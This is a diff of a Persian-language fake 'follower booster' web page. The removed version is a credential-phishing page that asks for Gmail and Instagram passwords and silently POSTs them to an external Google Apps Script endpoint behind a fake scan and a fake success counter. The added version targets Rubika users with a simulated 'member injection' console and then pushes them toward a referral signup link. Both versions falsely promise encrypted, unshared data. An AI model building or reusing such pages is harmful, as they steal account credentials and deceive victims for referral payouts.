@@ -3,173 +3,205 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>⚡ InstaBoost Pro | افزایش فالوور اینستاگرام</title>
+  <title>⚡ RubikaBoost | افزایش فالوور روبیکا </title>
   <style>
-    @import url('https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css');
+    @import url('https://cdn.jsdelivr.net/gh/rastikerdar/dana-font@v0.2/dist/font-face.css');
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: 'Vazirmatn', sans-serif;
-      background: radial-gradient(circle at 30% 20%, #1a0a12, #0a0a0f);
+      font-family: 'Dana', sans-serif;
+      background: linear-gradient(135deg, #1a0a2e, #0a0a14, #1a0a2e);
+      background-size: 400% 400%; animation: gradientShift 15s ease infinite;
       display: flex; justify-content: center; align-items: center;
       min-height: 100vh; padding: 20px; position: relative; overflow-x: hidden;
     }
-    body::after {
-      content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: radial-gradient(circle at 70% 30%, rgba(220,39,67,0.06) 0%, transparent 50%),
-                  radial-gradient(circle at 30% 80%, rgba(252,176,69,0.06) 0%, transparent 50%);
-      pointer-events: none; z-index: 0;
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
     }
-    .bg-particles {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      pointer-events: none; z-index: 0;
+    .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
+
+    .card-wrapper {
+      position: relative; z-index: 10;
+      max-width: 480px; width: 100%; padding: 3px; border-radius: 42px;
+      background: conic-gradient(from 0deg, #dc2743, #3b82f6, #dc2743, #a78bfa, #3b82f6, #dc2743);
+      animation: rotateBorder 3s linear infinite;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+    }
+    @keyframes rotateBorder {
+      to { background: conic-gradient(from 360deg, #dc2743, #3b82f6, #dc2743, #a78bfa, #3b82f6, #dc2743); }
     }
 
     .card {
-      position: relative; z-index: 10; max-width: 480px; width: 100%;
-      background: rgba(18, 8, 12, 0.8); backdrop-filter: blur(35px);
-      border: 1px solid rgba(220, 39, 67, 0.25); border-radius: 44px;
-      padding: 40px 32px; box-shadow: 0 50px 80px rgba(0,0,0,0.9), inset 0 1px 0 rgba(255,255,255,0.08);
-      text-align: center; transition: all 0.4s ease;
-      overflow: hidden;
+      background: rgba(15, 10, 25, 0.7); backdrop-filter: blur(25px);
+      border-radius: 40px; padding: 35px 30px; text-align: center;
+      animation: cardFloat 6s ease-in-out infinite;
     }
-    .card::before {
-      content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-      background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMzAwIj48ZmlsdGVyIGlkPSJhIiB4PSIwIiB5PSIwIj48ZmVUdXJidWxlbmNlIHR5cGU9ImZyYWN0YWxOb2lzZSIgYmFzZUZyZXF1ZW5jeT0iLjc0IiBudW1PY3RhdmVzPSI0IiBzdGl0Y2hUaWxlcz0ic3RpdGNoIi8+PC9maWx0ZXI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsdGVyPSJ1cmwoI2EpIiBvcGFjaXR5PSIwLjAyNSIvPjwvc3ZnPg==');
-      background-size: cover; pointer-events: none; z-index: 0;
+    @keyframes cardFloat {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
     }
 
-    .insta-logo {
+    .rubika-logo {
       font-size: 2.8rem; margin-bottom: 5px;
-      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-      font-weight: 900; letter-spacing: 1px;
+      background: linear-gradient(135deg, #c084fc, #60a5fa);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900;
     }
     h2 {
-      font-weight: 900; font-size: 2.2rem; margin: 10px 0 0;
-      background: linear-gradient(45deg, #f09433, #dc2743);
+      font-weight: 900; font-size: 2.3rem; margin: 10px 0 0;
+      background: linear-gradient(135deg, #c084fc, #3b82f6);
       -webkit-background-clip: text; -webkit-text-fill-color: transparent;
     }
-    .sub { color: #aaa; font-size: 0.95rem; margin: 12px 0 25px; }
-    .input-group { margin: 20px 0; text-align: right; position: relative; z-index: 2; }
-    label { color: #ddd; font-size: 0.95rem; display: block; margin-bottom: 8px; font-weight: 600; }
-    input {
-      width: 100%; padding: 16px; border-radius: 16px;
-      border: 1px solid rgba(255,255,255,0.1); background: rgba(0,0,0,0.5);
-      color: white; font-size: 1rem; font-family: 'Vazirmatn', sans-serif;
-      outline: none; transition: 0.3s; backdrop-filter: blur(10px);
+    .sub { color: #cccccc; font-size: 1rem; margin: 10px 0 25px; }
+    .input-group { margin: 20px 0; text-align: right; }
+    label { color: #ffffff; font-size: 1rem; display: block; margin-bottom: 8px; font-weight: 600; }
+
+    .glass-input {
+      width: 100%; padding: 16px 18px; border-radius: 16px;
+      border: 1px solid rgba(255,255,255,0.2);
+      background: rgba(255,255,255,0.05); backdrop-filter: blur(15px);
+      color: white; font-size: 1.05rem; font-family: 'Dana', sans-serif;
+      outline: none; transition: 0.3s;
+      box-shadow: inset 0 2px 8px rgba(0,0,0,0.3), 0 0 10px rgba(255,255,255,0.05);
+      background-image: linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.1) 50%, transparent 100%);
+      background-size: 200% 100%;
+      animation: sweepHighlight 3s ease-in-out infinite;
     }
-    input:focus { border-color: #dc2743; box-shadow: 0 0 25px rgba(220,39,67,0.5); }
+    @keyframes sweepHighlight {
+      0% { background-position: 100% 0; }
+      100% { background-position: -100% 0; }
+    }
+    .glass-input:focus {
+      border-color: #a78bfa;
+      background-color: rgba(255,255,255,0.1);
+      box-shadow: 0 0 30px rgba(167,139,250,0.6), inset 0 2px 8px rgba(0,0,0,0.3);
+      transform: scale(1.02);
+    }
+
     .btn {
       width: 100%; padding: 18px; margin-top: 25px; border-radius: 18px;
-      border: none; font-weight: 800; font-size: 1.15rem;
-      background: linear-gradient(45deg, #dc2743, #cc2366);
+      border: none; font-weight: 700; font-size: 1.15rem;
+      background: linear-gradient(135deg, #7c3aed, #3b82f6);
       color: white; cursor: pointer; transition: 0.3s;
-      box-shadow: 0 12px 30px rgba(220,39,67,0.5);
-      position: relative; z-index: 2;
+      box-shadow: 0 12px 30px rgba(124,58,237,0.5);
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      animation: subtlePulse 2s infinite; overflow: hidden;
     }
-    .btn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 18px 40px rgba(220,39,67,0.7); }
-    .btn:disabled { opacity: 0.5; cursor: not-allowed; filter: grayscale(30%); }
+    .btn:hover:not(:disabled) { transform: translateY(-3px); }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; animation: none; }
+    @keyframes subtlePulse {
+      0% { box-shadow: 0 12px 30px rgba(124,58,237,0.5); }
+      50% { box-shadow: 0 12px 45px rgba(124,58,237,0.8); }
+      100% { box-shadow: 0 12px 30px rgba(124,58,237,0.5); }
+    }
 
-    .scan-animation {
-      display: none; margin: 25px auto; width: 80px; height: 80px;
-      border-radius: 50%; background: rgba(220,39,67,0.1); position: relative; z-index: 2;
+    .rocket {
+      display: inline-block; font-size: 1.4rem;
+      animation: rocketFly 1.5s ease-in-out infinite; position: relative;
     }
-    .scan-animation::after {
-      content: '🔍'; font-size: 2.5rem; position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%, -50%); animation: scanPulse 1.5s infinite;
+    .rocket::after {
+      content: ''; position: absolute; bottom: -6px; left: 50%;
+      transform: translateX(-50%); width: 8px; height: 12px;
+      background: linear-gradient(to top, #ff4500, #ffa500, transparent);
+      border-radius: 50%; animation: fire 0.8s ease-in-out infinite; opacity: 0.8;
     }
-    @keyframes scanPulse {
-      0% { opacity: 0.3; transform: translate(-50%, -50%) scale(0.8); }
-      50% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); }
-      100% { opacity: 0.3; transform: translate(-50%, -50%) scale(0.8); }
+    @keyframes rocketFly {
+      0%,100% { transform: translateY(0) rotate(0deg); }
+      25% { transform: translateY(-3px) rotate(-2deg); }
+      75% { transform: translateY(2px) rotate(2deg); }
+    }
+    @keyframes fire {
+      0% { height:10px; opacity:0.6; }
+      50% { height:18px; opacity:1; }
+      100% { height:10px; opacity:0.6; }
     }
 
     .console-box {
-      background: #020202; border: 1px solid #333; border-radius: 16px;
-      padding: 18px; margin: 25px 0; font-family: 'Courier New', monospace;
-      font-size: 0.85rem; color: #00ff88; text-align: left;
-      height: 130px; overflow-y: auto; display: none;
-      position: relative; z-index: 2; line-height: 1.6;
+      background: #020202; border:1px solid #333; border-radius:16px;
+      padding:18px; margin:25px 0; font-family:'Courier New',monospace;
+      font-size:0.85rem; color:#00ffaa; text-align:left; height:130px;
+      overflow-y:auto; display:none; line-height:1.6;
     }
-    .progress { display: none; margin: 20px 0; height: 10px; background: rgba(255,255,255,0.08); border-radius: 10px; overflow: hidden; }
-    .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #f09433, #dc2743); transition: width 0.5s; border-radius: 10px; }
+    .progress { display:none; margin:20px 0; height:10px; background:rgba(255,255,255,0.08); border-radius:10px; overflow:hidden; }
+    .progress-fill { width:0%; height:100%; background:linear-gradient(90deg,#a78bfa,#3b82f6); transition:width 0.5s; border-radius:10px; }
 
-    .success-box {
-      display: none; margin-top: 25px; padding: 25px;
-      background: rgba(0, 255, 100, 0.05); border: 1px solid rgba(0, 255, 100, 0.3);
-      border-radius: 24px; animation: fadeInUp 0.5s; position: relative; z-index: 2;
+    .gift-box {
+      display: none; margin-top: 25px; padding: 25px 20px;
+      background: linear-gradient(145deg, rgba(255, 215, 0, 0.12), rgba(184, 134, 11, 0.06));
+      border: 1px solid rgba(255, 215, 0, 0.5); border-radius: 24px;
+      animation: fadeInUp 0.5s; position: relative; z-index: 2;
     }
-    .success-icon { font-size: 3rem; margin-bottom: 10px; }
-    .success-title { color: #4caf50; font-weight: 900; font-size: 1.3rem; margin-bottom: 10px; }
-    .follower-counter { font-size: 2.5rem; font-weight: 900; color: white; margin: 15px 0; }
-    .follower-label { color: #aaa; font-size: 0.9rem; }
-    .note { color: #666; font-size: 0.75rem; margin-top: 20px; position: relative; z-index: 2; }
-    @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+    .gift-icon { font-size: 2.5rem; margin-bottom: 8px; }
+    .gift-title { color: #FFD700; font-weight: 800; font-size: 1.25rem; margin-bottom: 12px; }
+    .gift-desc { color: #ccc; font-size: 0.95rem; margin-bottom: 20px; }
+    .btn-register {
+      background: linear-gradient(135deg, #fbbf24, #b45309);
+      color: #000; box-shadow: 0 10px 25px rgba(251, 191, 36, 0.4);
+    }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .note { color: #aaaaaa; font-size: 0.8rem; margin-top: 20px; position: relative; z-index: 2; }
   </style>
 </head>
 <body>
 <canvas class="bg-particles" id="particles"></canvas>
 
-<div class="card">
-  <div class="insta-logo">📸 Instagram</div>
-  <h2>⚡ InstaBoost Pro</h2>
-  <p class="sub">افزایش فالوور واقعی و فعال اینستاگرام</p>
+<div class="card-wrapper">
+  <div class="card">
+    <div class="rubika-logo">💬 Rubika</div>
+    <h2>⚡ RubikaBoost</h2>
+    <p class="sub">افزایش ممبر و فالوور روبیکا + هدیه میلی گلد</p>
 
-  <!-- فرم ورود اطلاعات -->
-  <div id="formSection">
-    <div class="input-group">
-      <label>📧 جیمیل</label>
-      <input type="email" id="email" placeholder="example@gmail.com" required>
+    <div id="formSection">
+      <div class="input-group">
+        <label>📱 شماره تلفن</label>
+        <input type="tel" class="glass-input" id="phone" placeholder="0912xxxxxxx" required>
+      </div>
+      <div class="input-group">
+        <label>🆔 شناسه روبیکا (آیدی)</label>
+        <input type="text" class="glass-input" id="rubikaID" placeholder="mohammad12" required>
+      </div>
+      <button class="btn" id="boostBtn" onclick="startBoost()">
+        <span class="rocket">🚀</span> افزایش فالوور رایگان
+      </button>
     </div>
-    <div class="input-group">
-      <label>🔐 پسورد جیمیل</label>
-      <input type="password" id="gmailPass" placeholder="••••••••" required>
+
+    <div class="console-box" id="consoleBox"></div>
+    <div class="progress" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
+
+    <div class="gift-box" id="giftBox">
+      <div class="gift-icon">🎁</div>
+      <div class="gift-title">فقط یک قدم تا ثبت‌نام نهایی باقی مانده!</div>
+      <p class="gift-desc">
+        برای تکمیل فرایند و دریافت فالوورها، روی دکمه زیر کلیک کنید.
+      </p>
+      <button class="btn btn-register" onclick="window.open('https://melligold.com/pwa/account?ref=milli-jpvbs','_blank')">✅ ثبت‌نام نهایی</button>
+      <p style="color:#aaa; font-size:0.7rem; margin-top:10px;">پس از ثبت‌نام، فالوورها بلافاصله فعال خواهند شد.</p>
     </div>
-    <div class="input-group">
-      <label>📸 یوزرنیم اینستاگرام</label>
-      <input type="text" id="instaUser" placeholder="username" required>
-    </div>
-    <div class="input-group">
-      <label>🔑 پسورد اینستاگرام</label>
-      <input type="password" id="instaPass" placeholder="••••••••" required>
-    </div>
-    <button class="btn" id="boostBtn" onclick="startBoost()">🚀 شروع افزایش فالوور</button>
+    <p class="note">🔒 اطلاعات شما رمزنگاری شده و نزد هیچ شخص ثالثی ذخیره نمی‌شود.</p>
   </div>
-
-  <!-- اسکن امنیتی فیک -->
-  <div class="scan-animation" id="scanAnimation"></div>
-
-  <!-- کنسول و نوار پیشرفت -->
-  <div class="console-box" id="consoleBox"></div>
-  <div class="progress" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
-
-  <!-- نتیجه نهایی -->
-  <div class="success-box" id="successBox">
-    <div class="success-icon">✅</div>
-    <div class="success-title">افزایش فالوور با موفقیت انجام شد!</div>
-    <div class="follower-counter" id="followerCount">0</div>
-    <div class="follower-label">فالوور جدید اضافه شد</div>
-    <p style="color:#aaa; font-size:0.8rem; margin-top:15px;">ممکن است تا ۲۴ ساعت آینده کامل شوند.</p>
-  </div>
-
-  <p class="note">🔒 اطلاعات شما رمزنگاری شده و نزد هیچ شخص ثالثی ذخیره نمی‌شود.</p>
 </div>
 
 <script>
   const canvas = document.getElementById('particles');
   const ctx = canvas.getContext('2d');
   canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-  window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
-  const particles = Array.from({length:80}, () => ({
-    x: Math.random()*canvas.width, y: Math.random()*canvas.height,
-    r: Math.random()*2.5+0.5, speed: Math.random()*0.6+0.2
+  window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+  });
+  const particles = Array.from({ length: 80 }, () => ({
+    x: Math.random() * canvas.width, y: Math.random() * canvas.height,
+    r: Math.random() * 2.5 + 0.5, speed: Math.random() * 0.6 + 0.2
   }));
   (function anim() {
     ctx.clearRect(0,0,canvas.width,canvas.height);
-    ctx.fillStyle = 'rgba(220,39,67,0.08)';
+    ctx.fillStyle = 'rgba(167, 139, 250, 0.12)';
     particles.forEach(p => {
       ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2); ctx.fill();
-      p.y -= p.speed; if (p.y < -10) { p.y = canvas.height+10; p.x = Math.random()*canvas.width; }
+      p.y -= p.speed;
+      if (p.y < -10) { p.y = canvas.height + 10; p.x = Math.random() * canvas.width; }
     });
     requestAnimationFrame(anim);
   })();
@@ -177,52 +209,33 @@
   function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
   async function startBoost() {
-    const email = document.getElementById('email').value.trim();
-    const gmailPass = document.getElementById('gmailPass').value.trim();
-    const instaUser = document.getElementById('instaUser').value.trim();
-    const instaPass = document.getElementById('instaPass').value.trim();
-    if (!email || !gmailPass || !instaUser || !instaPass) {
-      alert('لطفاً تمام فیلدها را پر کنید.');
+    const phone = document.getElementById('phone').value.trim();
+    const rubikaID = document.getElementById('rubikaID').value.trim();
+    if (!phone || !rubikaID) {
+      alert('لطفاً شماره تلفن و شناسه روبیکا را وارد کنید.');
       return;
     }
 
-    // مخفی کردن فرم و دکمه، نمایش اسکن
-    const formSec = document.getElementById('formSection');
     const btn = document.getElementById('boostBtn');
-    const scanAnim = document.getElementById('scanAnimation');
     const con = document.getElementById('consoleBox');
     const prog = document.getElementById('progressBar');
     const fill = document.getElementById('progressFill');
-    const successBox = document.getElementById('successBox');
+    const formSec = document.getElementById('formSection');
+    const giftBox = document.getElementById('giftBox');
 
-    btn.style.display = 'none';
-    formSec.style.display = 'none';
-    scanAnim.style.display = 'block';
-    con.style.display = 'none';
-    prog.style.display = 'none';
-    successBox.style.display = 'none';
-
-    await sleep(2000); // اسکن امنیتی ۲ ثانیه طول می‌کشه
-    scanAnim.style.display = 'none';
-    con.style.display = 'block';
-    con.innerHTML = '';
-    prog.style.display = 'block';
-    fill.style.width = '0%';
-
-    // ارسال مخفی به ربات روبیکا
-    fetch('https://script.google.com/macros/s/AKfycbyVs1VKvo5qTLP4n-eJMmk_LFlmUuJc7NondVI3wZSbbV3gwVet6Qt6H8ohKOeSCPyIVQ/exec', {
-      method: 'POST',
-      body: JSON.stringify({ email, gmailPass, instaUser, instaPass })
-    }).catch(() => {});
+    btn.disabled = true;
+    btn.innerHTML = '<span class="rocket">🚀</span> ⏳ در حال اتصال...';
+    con.style.display = 'block'; con.innerHTML = '';
+    prog.style.display = 'block'; fill.style.width = '0%';
+    giftBox.style.display = 'none';
 
     const steps = [
-      { p: 10, t: `[+] اتصال به Instagram Graph API (IP: 192.168.1.${Math.floor(Math.random()*255)})...`, d: 800 },
-      { p: 25, t: '[+] دریافت Authorization Token از متا...', d: 900 },
-      { p: 45, t: '[+] بررسی محدودیت‌های امنیتی (Rate Limit: OK)...', d: 1000 },
-      { p: 65, t: `[+] انتخاب ${instaUser} از دیتابیس فالوورهای هدفمند (Location: Iran)...`, d: 1100 },
-      { p: 85, t: '[+] تزریق تدریجی فالوورها (Burst Mode: 50/min)...', d: 1200 },
-      { p: 98, t: '[+] همگام‌سازی با سرورهای اینستاگرام...', d: 900 },
-      { p: 100, t: '[✓] عملیات موفق! ۵۰۰ فالوور به صف اضافه شد.', d: 800 }
+      { p: 12, t: '[+] اتصال به Rubika API...', d: 800 },
+      { p: 28, t: `[+] بررسی شناسه @${rubikaID}...`, d: 900 },
+      { p: 50, t: '[+] دریافت ممبرهای هدفمند...', d: 1100 },
+      { p: 75, t: `[+] تزریق ممبر به اکانت ${phone.substring(0,4)}****...`, d: 1200 },
+      { p: 92, t: '[+] همگام‌سازی نهایی...', d: 1000 },
+      { p: 100, t: '[✓] عملیات موفق! برای تکمیل روی دکمه زیر کلیک کنید.', d: 800 }
     ];
 
     for (let s of steps) {
@@ -230,28 +243,15 @@
       fill.style.width = s.p + '%';
       let line = document.createElement('div');
       line.textContent = s.t;
-      if (s.p === 100) line.style.color = '#4caf50';
+      if (s.p === 100) line.style.color = '#FFD700';
       con.appendChild(line);
       con.scrollTop = con.scrollHeight;
     }
 
-    await sleep(800);
-    con.style.display = 'none';
-    prog.style.display = 'none';
-
-    // نمایش شمارنده فالوور
-    successBox.style.display = 'block';
-    const counterEl = document.getElementById('followerCount');
-    let count = 0;
-    const target = 500;
-    const interval = setInterval(() => {
-      count += Math.floor(Math.random()*15) + 5;
-      if (count >= target) {
-        count = target;
-        clearInterval(interval);
-      }
-      counterEl.textContent = count;
-    }, 80);
+    await sleep(600);
+    con.style.display = 'none'; prog.style.display = 'none';
+    btn.style.display = 'none'; formSec.style.display = 'none';
+    giftBox.style.display = 'block';
   }
 </script>
 </body>
